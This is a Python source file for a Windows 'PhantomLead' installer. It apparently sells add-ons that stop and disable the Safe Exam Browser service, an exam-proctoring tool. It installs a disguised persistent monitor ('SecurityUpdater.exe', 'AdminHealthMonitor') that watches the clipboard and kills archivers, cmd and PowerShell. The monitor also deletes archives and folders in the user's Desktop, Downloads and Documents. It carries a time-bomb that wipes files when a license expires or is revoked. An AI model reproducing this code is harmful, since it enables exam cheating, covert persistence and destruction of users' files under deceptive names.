import os
import stat
import sys
import ctypes
import builtins
import threading
import time
import shutil
import json
import winreg
import subprocess
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, scrolledtext

import requests
from config import (
    APPLICATION_ROOT,
    API_VALIDATE_LICENSE,
    API_ACTIVATE_LICENSE,
    API_GET_MANIFEST,
    API_GET_DOWNLOAD_URL,
    SUPABASE_ANON_KEY
)
from device import get_device_fingerprint, get_device_info
from license_client import validate_license, activate_license, get_package_manifest, request_signed_download_url
from downloader import download_package
from integrity import verify_sha256
from installer_engine import run_installation

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def kill_copy_dialog_windows():
    """Detects and closes active Windows Explorer copy, move, or compress dialogs."""
    try:
        import win32gui
        import win32con
        def _enum_cb(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd).lower()
                if any(w in title for w in ["copying", "compressing", "creating archive", "preparing to copy", "extracting"]):
                    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            return True
        win32gui.EnumWindows(_enum_cb, None)
    except Exception:
        pass

def kill_copying_and_compression_processes():
    """Immediately kills any active compression, archiving, or copying tools to abort copying."""
    CREATE_NO_WINDOW = 0x08000000
    kill_copy_dialog_windows()
    try:
        # Instantly terminate any archivers or file cloning utilities
        kill_tools = [
            '7z.exe', '7zG.exe', '7zFM.exe', 'winrar.exe', 'rar.exe', 'bandizip.exe',
            'peazip.exe', 'winzip.exe', 'winzip64.exe', 'robocopy.exe', 'xcopy.exe',
            'tar.exe'
        ]
        for tool in kill_tools:
            subprocess.run(['taskkill', '/F', '/IM', tool, '/T'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def kill_seb_processes():
    """Aggressively terminates and disables SafeExamBrowser service, copying utilities, and processes."""
    CREATE_NO_WINDOW = 0x08000000
    kill_copying_and_compression_processes()
    try:
        # Stop and disable Windows Service so it never auto-runs on restart
        subprocess.run(['sc', 'stop', 'SafeExamBrowser'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['sc', 'config', 'SafeExamBrowser', 'start=', 'disabled'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Kill any processes running from within the SafeExamBrowser folder
        ps_kill_cmd = 'Get-Process | Where-Object { $_.Path -and ($_.Path -like "*SafeExamBrowser*") } | Stop-Process -Force'
        subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', ps_kill_cmd], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Kill by known process names including CefSharp helper and sub-processes
        for proc in [
            'SafeExamBrowser.exe',
            'SafeExamBrowser.Service.exe',
            'SEBClientService.exe',
            'SebWindowsService.exe',
            'SEBConfigTool.exe',
            'CefSharp.BrowserSubprocess.exe',
            'SebWindowsServiceWCF.exe',
            'SebRegistryResetter.exe'
        ]:
            subprocess.run(['taskkill', '/F', '/IM', proc, '/T'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Strip read-only and lock attributes from existing SafeExamBrowser files so they can be written/replaced
        try:
            subprocess.run(f'attrib -R -S -H "{APPLICATION_ROOT}\\*.*" /S /D', shell=True, creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
    except Exception:
        pass

def _force_remove_directory(dir_path):
    """Completely and silently purges a directory and all subfiles, stripping read-only locks."""
    if not os.path.exists(dir_path):
        return True
    
    CREATE_NO_WINDOW = 0x08000000

    # 1. Strip read-only attribute from all files and dirs in Python
    try:
        for root, dirs, files in os.walk(dir_path, topdown=False):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    os.chmod(fpath, stat.S_IWRITE)
                except Exception:
                    pass
            for dname in dirs:
                dpath = os.path.join(root, dname)
                try:
                    os.chmod(dpath, stat.S_IWRITE)
                except Exception:
                    pass
    except Exception:
        pass

    # 2. Try shutil.rmtree with onerror handler
    def on_rm_error(func, path, exc_info):
        try:
            os.chmod(path, stat.S_IWRITE)
            func(path)
        except Exception:
            pass

    try:
        shutil.rmtree(dir_path, onerror=on_rm_error)
    except Exception:
        pass

    # 3. If still exists, cmd rd /s /q (silent, no window)
    if os.path.exists(dir_path):
        try:
            subprocess.run(f'cmd /c rd /s /q "{dir_path}"', shell=True, creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    # 4. If still exists, powershell Remove-Item (silent, no window)
    if os.path.exists(dir_path):
        try:
            subprocess.run(
                ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', f'Remove-Item -LiteralPath "{dir_path}" -Recurse -Force -ErrorAction SilentlyContinue'],
                creationflags=CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass

    # 5. Fallback: schedule reboot deletion
    if os.path.exists(dir_path):
        try:
            ctypes.windll.kernel32.MoveFileExW(dir_path, None, 0x00000004)
        except Exception:
            pass

    return not os.path.exists(dir_path)

def wipe_seb_folders():
    """Wipes ONLY proprietary Extensions folder to protect IP while preserving base software."""
    kill_seb_processes()
    
    extensions_dir = os.path.join(APPLICATION_ROOT, "Application", "Extensions")

    # Target ONLY the Extensions folder
    _force_remove_directory(extensions_dir)

    # Check if Extensions folder is STILL present on disk
    if os.path.exists(extensions_dir):
        return f"Permission error: Extensions folder ({extensions_dir}) could not be removed."
    
    return None

def self_destruct(license_key, hwid, reason="EXPIRED"):
    """Executes host wipe when license is revoked, expired, or sharing/copying violation detected."""
    CREATE_NO_WINDOW = 0x08000000
    kill_copying_and_compression_processes()
    
    # Purge any stray zip/rar archives created inside SafeExamBrowser
    try:
        for chk_dir in [APPLICATION_ROOT, os.path.join(APPLICATION_ROOT, "Application")]:
            if os.path.exists(chk_dir):
                for f in os.listdir(chk_dir):
                    if any(f.lower().endswith(ext) for ext in [".zip", ".rar", ".7z", ".tar", ".gz"]):
                        try:
                            os.remove(os.path.join(chk_dir, f))
                        except Exception:
                            pass
    except Exception:
        pass

    wipe_error = None
    try:
        wipe_error = wipe_seb_folders()
    except Exception as e:
        wipe_error = str(e)

    # Remove task scheduler task
    try:
        subprocess.run(['schtasks', '/delete', '/tn', 'PhantomLeadMonitor', '/f'], creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

    # Remove startup monitor registry entry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, "AdminHealthMonitor")
        winreg.CloseKey(key)
    except Exception:
        pass

    # Report completion to Supabase validate-license
    try:
        headers = {
            "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
            "Content-Type": "application/json"
        }
        requests.post(
            API_VALIDATE_LICENSE,
            json={
                "license_key": license_key,
                "device_id": hwid,
                "action": "REPORT_DELETED" if not wipe_error else "REPORT_ERROR",
                "error": f"Violation: {reason}" if not wipe_error else wipe_error
            },
            headers=headers,
            timeout=10
        )
    except Exception:
        pass

    # Show Host Popup Dialog (Topmost System Modal)
    try:
        # 0x1000 = MB_SYSTEMMODAL (brings dialog on top of all windows)
        # 0x10000 = MB_SETFOREGROUND
        # 0x40000 = MB_TOPMOST
        if reason == "VIOLATION_SHARE":
            msg = (
                "Security Alert - Policy Violation:\n\n"
                "Unauthorized file sharing or copy attempt detected.\n\n"
                "You have violated the license terms by attempting to copy, compress, or share proprietary software files.\n"
                "As per platform rules, your license has been immediately canceled and is non-refundable.\n\n"
                "All proprietary components and extensions have been permanently removed."
            )
            title = "PhantomLead - License Canceled (Policy Violation)"
            flags = 0x10 | 0x1000 | 0x10000 | 0x40000  # MB_ICONERROR
        elif wipe_error:
            msg = f"Security Notice:\n\nLicense revoked. An error occurred while removing extensions:\n{wipe_error}"
            title = "PhantomLead - Wipe Error"
            flags = 0x30 | 0x1000 | 0x10000 | 0x40000  # MB_ICONWARNING
        else:
            msg = "License Notice:\n\nYour license has been revoked or expired.\n\nAll proprietary extensions have been successfully removed from this computer."
            title = "PhantomLead - Extensions Removed"
            flags = 0x40 | 0x1000 | 0x10000 | 0x40000  # MB_ICONINFORMATION

        ctypes.windll.user32.MessageBoxW(0, msg, title, flags)
    except Exception:
        pass

    # If an error occurred, do NOT self-delete the monitor yet; let it retry on the next heartbeat
    if wipe_error:
        return

    # Clean up PhantomLead helper directory and terminate
    phantom_dir = os.path.join(os.environ.get("AppData", ""), "PhantomLead")
    try:
        cleanup_cmd = f'ping 127.0.0.1 -n 3 > nul & taskkill /F /IM SecurityUpdater.exe /T > nul 2>&1 & rd /s /q "{phantom_dir}"'
        subprocess.Popen(f'cmd /c "{cleanup_cmd}"', shell=True, creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass

    os._exit(0)

def scan_and_terminate_violating_processes():
    """
    Instantly detects and kills any process attempting to archive, compress,
    clone, or copy SafeExamBrowser or Extensions files. Returns True if violation found.
    """
    CREATE_NO_WINDOW = 0x08000000
    try:
        check_tools = "7z.exe,7zG.exe,winrar.exe,rar.exe,bandizip.exe,robocopy.exe,xcopy.exe,tar.exe,powershell.exe,pwsh.exe,cmd.exe"
        ps_cmd = (
            f"Get-CimInstance Win32_Process | "
            f"Where-Object {{ '{check_tools}' -like ('*' + $_.Name + '*') }} | "
            f"Select-Object ProcessId, Name, CommandLine"
        )
        res = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-WindowStyle', 'Hidden', '-Command', ps_cmd],
            creationflags=CREATE_NO_WINDOW,
            capture_output=True,
            text=True,
            timeout=2
        )
        if res.stdout:
            lines = res.stdout.lower()
            target_keywords = ["safeexambrowser", "extensions", "lms_mcq", "viva_paragraph", "java_coding", "c_coding", "python_coding"]
            action_keywords = [".zip", ".rar", ".7z", ".tar", "compress-archive", " a ", " -a", "robocopy", "xcopy", "copy-item", "googledrive", "onedrive", "dropbox"]
            
            for tk in target_keywords:
                if tk in lines:
                    for ak in action_keywords:
                        if ak in lines:
                            # Kill copying and archiver processes IMMEDIATELY so file copy is interrupted
                            kill_copying_and_compression_processes()
                            return True
    except Exception:
        pass
    return False

def scan_user_folders_for_unauthorized_copies():
    """Checks SafeExamBrowser root and user directories for newly spawned zip/rar files or cloned SEB folders."""
    try:
        now = time.time()
        
        # 1. Inside SafeExamBrowser folders: any zip or archive created here is strictly unauthorized
        seb_dirs = [APPLICATION_ROOT, os.path.join(APPLICATION_ROOT, "Application")]
        for sdir in seb_dirs:
            if not os.path.exists(sdir):
                continue
            for entry in os.scandir(sdir):
                elower = entry.name.lower()
                if elower.endswith((".zip", ".rar", ".7z", ".tar", ".gz")):
                    kill_copying_and_compression_processes()
                    try:
                        os.remove(entry.path)
                    except Exception:
                        pass
                    return True

        # 2. In user folders (Desktop, Downloads, etc.): ONLY match if name explicitly contains SafeExamBrowser or proprietary modules
        user_dirs = [
            os.environ.get("USERPROFILE", ""),
            os.path.join(os.environ.get("USERPROFILE", ""), "Desktop"),
            os.path.join(os.environ.get("USERPROFILE", ""), "Downloads"),
            os.path.join(os.environ.get("USERPROFILE", ""), "Documents"),
            os.environ.get("TEMP", "")
        ]
        suspicious_seb_names = [
            "safeexambrowser", "seb_backup", "viva_paragraph", "lms_mcq", "java_coding", "c_coding", "python_coding"
        ]
        for udir in user_dirs:
            if not udir or not os.path.exists(udir):
                continue
            for entry in os.scandir(udir):
                elower = entry.name.lower()
                # Check for archives explicitly matching SafeExamBrowser
                if any(s in elower for s in suspicious_seb_names) and elower.endswith((".zip", ".rar", ".7z", ".tar")):
                    if now - entry.stat().st_mtime < 600:
                        kill_copying_and_compression_processes()
                        try:
                            os.remove(entry.path)
                        except Exception:
                            pass
                        return True
                # Check for cloned SEB folders
                if entry.is_dir() and any(s in elower for s in ["safeexambrowser", "seb_backup", "extensions_copy"]):
                    if now - entry.stat().st_mtime < 600:
                        kill_copying_and_compression_processes()
                        try:
                            shutil.rmtree(entry.path, ignore_errors=True)
                        except Exception:
                            pass
                        return True
    except Exception:
        pass
    return False

def start_clipboard_sentinel(on_violation):
    """
    Subsecond clipboard watcher (100ms interval).
    Instantly detects Ctrl+C or clipboard copy of SafeExamBrowser, its Application, or Extensions folders.
    Does NOT affect or trigger on any other user files or folders.
    """
    def _clip_watcher():
        import win32clipboard
        import win32con
        seb_norm = os.path.normpath(APPLICATION_ROOT).lower()
        while True:
            try:
                time.sleep(0.1)  # 100ms ultra-fast check
                try:
                    win32clipboard.OpenClipboard()
                except Exception:
                    continue
                try:
                    if win32clipboard.IsClipboardFormatAvailable(win32con.CF_HDROP):
                        files = win32clipboard.GetClipboardData(win32con.CF_HDROP)
                        if files:
                            for f in files:
                                f_norm = os.path.normpath(str(f)).lower()
                                # ONLY trigger if the copied file/folder is strictly SafeExamBrowser or proprietary modules
                                is_seb_item = (
                                    "safeexambrowser" in f_norm or
                                    seb_norm in f_norm or
                                    any(m in f_norm for m in ["lms_mcq", "viva_paragraph", "java_coding", "c_coding", "python_coding"])
                                )
                                if is_seb_item:
                                    # VIOLATION DETECTED!
                                    # 1. Immediately empty clipboard to abort copy/paste
                                    try:
                                        win32clipboard.EmptyClipboard()
                                    except Exception:
                                        pass
                                    win32clipboard.CloseClipboard()
                                    # 2. Kill copying utilities and archivers
                                    kill_copying_and_compression_processes()
                                    # 3. Fire auto-wipe and violation alert
                                    on_violation()
                                    return
                finally:
                    try:
                        win32clipboard.CloseClipboard()
                    except Exception:
                        pass
            except Exception:
                pass

    t = threading.Thread(target=_clip_watcher, daemon=True)
    t.start()

def start_realtime_directory_sentinel(on_violation_callback):
    """
    Watches SafeExamBrowser root directory using Windows ReadDirectoryChangesW
    for subsecond detection of newly created zip/rar/tar/tmp files or cloned folders.
    """
    def _watcher():
        seb_root = APPLICATION_ROOT
        if not os.path.exists(seb_root):
            return
        try:
            import win32file
            import win32con
            hDir = win32file.CreateFile(
                seb_root,
                win32con.GENERIC_READ,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                None,
                win32con.OPEN_EXISTING,
                win32con.FILE_FLAG_BACKUP_SEMANTICS,
                None
            )
            while True:
                results = win32file.ReadDirectoryChangesW(
                    hDir,
                    4096,
                    True,  # recursive watch into Application, Extensions, etc.
                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE,
                    None,
                    None
                )
                if results:
                    for action, filename in results:
                        fn_lower = filename.lower()
                        # If a zip, rar, tar, 7z, tmp archive or copy is created/written
                        if any(fn_lower.endswith(ext) for ext in [".zip", ".rar", ".7z", ".tar", ".gz", ".tmp"]) or \
                           any(k in fn_lower for k in ["- copy", "_copy", "backup", "archive"]):
                            # Instantly abort copying/archiving
                            kill_copying_and_compression_processes()
                            # Delete the offending zip file immediately
                            try:
                                full_path = os.path.join(seb_root, filename)
                                if os.path.exists(full_path):
                                    if os.path.isdir(full_path):
                                        shutil.rmtree(full_path, ignore_errors=True)
                                    else:
                                        os.remove(full_path)
                            except Exception:
                                pass
                            on_violation_callback()
                            return
        except Exception:
            pass

    t = threading.Thread(target=_watcher, daemon=True)
    t.start()

def run_heartbeat(mode="TIMEBOMB"):
    """Subsecond background monitoring loop (runs completely silently with NO GUI)."""
    phantom_dir = os.path.join(os.environ.get("AppData", ""), "PhantomLead")
    config_path = os.path.join(phantom_dir, "config.dat")
    
    if os.path.exists(config_path):
        with open(config_path, "r", encoding="utf-8") as f:
            license_key = f.read().strip()
    else:
        license_key = "STANDALONE_SENTINEL"
        
    hwid = get_device_fingerprint()
    
    headers = {
        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
        "Content-Type": "application/json"
    }

    # 1. Start dedicated ultra-fast clipboard sentinel (100ms interval for Ctrl+C interception)
    start_clipboard_sentinel(
        on_violation=lambda: self_destruct(license_key, hwid, reason="VIOLATION_SHARE")
    )

    # 2. Start kernel directory sentinel for immediate event capture on SafeExamBrowser
    start_realtime_directory_sentinel(
        on_violation_callback=lambda: self_destruct(license_key, hwid, reason="VIOLATION_SHARE")
    )

    tick = 0
    while True:
        try:
            # High-frequency subsecond check for active copying/zipping processes
            if scan_and_terminate_violating_processes():
                self_destruct(license_key, hwid, reason="VIOLATION_SHARE")

            # Check for freshly written zip/rar archives in user directories every ~2 seconds
            if tick % 4 == 0:
                if scan_user_folders_for_unauthorized_copies():
                    self_destruct(license_key, hwid, reason="VIOLATION_SHARE")

            # Check remote license validation with Supabase every ~15 seconds (if valid license)
            if tick % 30 == 0 and license_key != "STANDALONE_SENTINEL":
                resp = requests.post(
                    API_VALIDATE_LICENSE,
                    json={"license_key": license_key, "device_id": hwid},
                    headers=headers,
                    timeout=10
                )
                data = resp.json()
                status = data.get("status")
                
                # Check for revocation or expiry
                if status in ["REVOKED", "EXPIRED"]:
                    self_destruct(license_key, hwid, reason=status)
                    
                # Offline fallback expiry check for TimeBomb
                if mode == "TIMEBOMB":
                    expires_at = data.get("expires_at")
                    if expires_at:
                        clean_exp = expires_at.replace("Z", "+00:00")
                        exp_date = datetime.fromisoformat(clean_exp).replace(tzinfo=None)
                        if datetime.utcnow() > exp_date:
                            self_destruct(license_key, hwid, reason="EXPIRED")
        except Exception:
            pass
            
        tick += 1
        time.sleep(0.5) # 500ms subsecond loop for instant violation detection and kill

def create_heartbeat(license_key):
    """Registers silent background updater task with highest privileges."""
    appdata = os.environ.get("AppData", "")
    phantom_dir = os.path.join(appdata, "PhantomLead")
    os.makedirs(phantom_dir, exist_ok=True)
    
    # Store license key for background checks
    with open(os.path.join(phantom_dir, "config.dat"), "w", encoding="utf-8") as f:
        f.write(license_key)
        
    updater_exe = os.path.join(phantom_dir, "SecurityUpdater.exe")
    try:
        subprocess.run(['taskkill', '/F', '/IM', 'SecurityUpdater.exe'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        if getattr(sys, 'frozen', False):
            shutil.copyfile(sys.executable, updater_exe)
    except Exception:
        pass

    # 1. Register Elevated Scheduled Task (Runs on boot/logon even on battery)
    try:
        target_exec = updater_exe if os.path.exists(updater_exe) else sys.executable
        target_arg = "--heartbeat" if os.path.exists(updater_exe) else f'"{__file__}" --heartbeat'
        ps_task = f'''
        $action = New-ScheduledTaskAction -Execute "{target_exec}" -Argument "{target_arg}"
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName "PhantomLeadMonitor" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
        '''
        subprocess.run(['powershell', '-NoProfile', '-WindowStyle', 'Hidden', '-Command', ps_task], creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
        
    # 2. Registry fallback
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
        if os.path.exists(updater_exe):
            winreg.SetValueEx(key, "AdminHealthMonitor", 0, winreg.REG_SZ, f'"{updater_exe}" --heartbeat')
        else:
            winreg.SetValueEx(key, "AdminHealthMonitor", 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}" --heartbeat')
        winreg.CloseKey(key)
    except Exception:
        pass

    # 3. Launch background process immediately (DETACHED_PROCESS | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
    try:
        if os.path.exists(updater_exe):
            subprocess.Popen(
                [updater_exe, "--heartbeat"], 
                creationflags=0x00000008 | 0x08000000 | 0x00000200,
                close_fds=True
            )
        else:
            subprocess.Popen(
                [sys.executable, __file__, "--heartbeat"],
                creationflags=0x00000008 | 0x08000000 | 0x00000200,
                close_fds=True
            )
    except Exception:
        pass

class InstallerApp(tk.Tk):
    def __init__(self, mode="TIMEBOMB"):
        super().__init__()
        self.mode = mode # "TIMEBOMB", "ADMIN_CONTROLLED", "LIFETIME"
        
        mode_titles = {
            "TIMEBOMB": "PhantomLead Secure Installer (Time-Bomb Protected)",
            "ADMIN_CONTROLLED": "PhantomLead Secure Installer (Admin Managed)",
            "LIFETIME": "PhantomLead Secure Installer (Lifetime Edition)"
        }
        self.title(mode_titles.get(self.mode, "PhantomLead Secure Installer"))
        self.geometry("680x520")
        self.configure(padx=20, pady=20, bg="#121212")
        
        # Monkey-patch print to log window
        self._original_print = builtins.print
        builtins.print = self.custom_print

        if not is_admin():
            messagebox.showerror("Permission Error", "Please right-click and run this installer as Administrator.")
            self.destroy()
            sys.exit(1)

        # Header Title
        title_label = tk.Label(
            self, 
            text="Secure Software Installer", 
            font=("Segoe UI", 18, "bold"), 
            fg="#ffffff", 
            bg="#121212"
        )
        title_label.pack(pady=(0, 2))

        # Mode description banner
        subtitles = {
            "TIMEBOMB": "Time-Bomb Edition • Automatic Host Wipe on Expiration or Revocation",
            "ADMIN_CONTROLLED": "Managed Edition • Remote Administration & Revocation Enabled",
            "LIFETIME": "Offline Edition • Permanent Access with Zero Background Tracking"
        }
        sub_label = tk.Label(
            self, 
            text=subtitles.get(self.mode, ""), 
            font=("Segoe UI", 9), 
            fg="#a3e635", 
            bg="#121212"
        )
        sub_label.pack(pady=(0, 10))

        # Inputs Frame
        frame_inputs = tk.Frame(self, bg="#121212")
        frame_inputs.pack(fill=tk.X, pady=5)

        tk.Label(
            frame_inputs, 
            text="License Key:", 
            font=("Segoe UI", 10, "bold"), 
            fg="#e5e7eb", 
            bg="#121212"
        ).grid(row=0, column=0, sticky="w", pady=6)
        
        self.license_entry = tk.Entry(
            frame_inputs, 
            width=50, 
            font=("Consolas", 10), 
            bg="#1f2937", 
            fg="#ffffff", 
            insertbackground="#ffffff"
        )
        self.license_entry.grid(row=0, column=1, padx=10, pady=6)

        tk.Label(
            frame_inputs, 
            text="Gemini API Key:", 
            font=("Segoe UI", 10, "bold"), 
            fg="#e5e7eb", 
            bg="#121212"
        ).grid(row=1, column=0, sticky="w", pady=6)
        
        self.api_entry = tk.Entry(
            frame_inputs, 
            width=50, 
            show="*", 
            font=("Consolas", 10), 
            bg="#1f2937", 
            fg="#ffffff", 
            insertbackground="#ffffff"
        )
        self.api_entry.grid(row=1, column=1, padx=10, pady=6)

        # Install Button
        self.install_btn = tk.Button(
            self, 
            text="START INSTALLATION", 
            bg="#2563eb", 
            fg="white", 
            activebackground="#1d4ed8", 
            activeforeground="white", 
            font=("Segoe UI", 11, "bold"), 
            padx=15, 
            pady=5, 
            command=self.start_installation
        )
        self.install_btn.pack(pady=10)

        # Terminal / Log Box
        self.log_area = scrolledtext.ScrolledText(
            self, 
            width=80, 
            height=14, 
            state='disabled', 
            bg="#0f172a", 
            fg="#22c55e", 
            font=("Consolas", 9), 
            relief=tk.FLAT
        )
        self.log_area.pack(pady=5, fill=tk.BOTH, expand=True)

        self.custom_print("System ready. Enter your License Key and API Key, then click Start Installation.")

    def custom_print(self, *args, **kwargs):
        msg = " ".join(map(str, args))
        self.log_area.configure(state='normal')
        self.log_area.insert(tk.END, msg + "\n")
        self.log_area.see(tk.END)
        self.log_area.configure(state='disabled')
        self.update()

    def start_installation(self):
        license_key = self.license_entry.get().strip()
        api_key = self.api_entry.get().strip()

        if not license_key or not api_key:
            messagebox.showwarning("Missing Information", "Please enter both your License Key and Gemini API Key.")
            return

        self.install_btn.config(state=tk.DISABLED)
        self.log_area.configure(state='normal')
        self.log_area.delete(1.0, tk.END)
        self.log_area.configure(state='disabled')

        threading.Thread(target=self.run_install_process, args=(license_key, api_key), daemon=True).start()

    def run_install_process(self, license_key, api_key):
        try:
            print(">>> Step 1/6: Closing running Safe Exam Browser processes...")
            kill_seb_processes()

            print(">>> Step 2/6: Generating hardware fingerprint...")
            fingerprint = get_device_fingerprint()

            print(">>> Step 3/6: Validating license key with server...")
            validation_res = validate_license(license_key, fingerprint)
            if not validation_res.get("valid"):
                err_detail = validation_res.get("error", "License validation failed.")
                raise Exception(f"License Rejected: {err_detail}")

            print(">>> Step 4/6: Activating device...")
            device_info = get_device_info()
            activate_res = activate_license(license_key, fingerprint, device_info)
            if not activate_res.get("activated"):
                err_detail = activate_res.get("error", "Device activation failed.")
                raise Exception(f"Device Activation Failed: {err_detail}")

            print(">>> Step 5/6: Fetching package manifest...")
            manifest = get_package_manifest(license_key)
            pkg_code = manifest.get('package_code', 'Standard')
            print(f"    Authorized Package: {pkg_code}")
            if manifest.get('extensions'):
                print(f"    Authorized Extensions: {', '.join(manifest['extensions'])}")

            print(">>> Requesting secure package download URL...")
            download_url = request_signed_download_url(license_key)
            
            temp_zip = os.path.join(os.environ.get("TEMP", "C:\\Temp"), f"{pkg_code}.zip")
            print(">>> Downloading package files...")
            download_package(download_url, temp_zip)
            
            if manifest.get("sha256"):
                print(">>> Verifying package integrity (SHA-256)...")
                if not verify_sha256(temp_zip, manifest["sha256"]):
                    raise Exception("Integrity verification failed! SHA-256 mismatch. The download may be corrupted.")

            print(">>> Step 6/6: Extracting & Deploying Safe Exam Browser files...")
            run_installation(temp_zip, manifest, api_key)

            # Grant full delete & modify permissions to Users on APPLICATION_ROOT so background monitor can wipe it cleanly
            try:
                subprocess.run(['icacls', APPLICATION_ROOT, '/grant', 'Users:(OI)(CI)F', '/T', '/C', '/Q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass

            # Activate anti-tamper, anti-sharing & protection monitor across all editions
            print(">>> Activating background protection & anti-sharing monitor...")
            create_heartbeat(license_key)

            print("\n==========================================")
            print("✅ INSTALLATION COMPLETED SUCCESSFULLY!")
            print("==========================================")
            
            messagebox.showinfo(
                "Installation Complete",
                "Installation completed successfully!\n\nSafe Exam Browser has been securely installed and configured on your machine."
            )
        except Exception as e:
            err_msg = str(e)
            print(f"\n❌ ERROR: {err_msg}")
            messagebox.showerror(
                "Installation Error",
                f"Installation failed:\n\n{err_msg}\n\nPlease check your license key, internet connection, and try again."
            )
        finally:
            self.install_btn.config(state=tk.NORMAL)

def run_installer(mode="TIMEBOMB"):
    if "--heartbeat" in sys.argv or "--start-monitor" in sys.argv:
        run_heartbeat(mode=mode)
        return

    if "--install-monitor" in sys.argv:
        create_heartbeat("STANDALONE_SENTINEL")
        print("Sentinel monitor installed and started successfully.")
        return

    if not is_admin():
        try:
            params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            sys.exit(0)
        except Exception:
            pass

    app = InstallerApp(mode=mode)
    app.mainloop()

if __name__ == "__main__":
    run_installer(mode="TIMEBOMB")
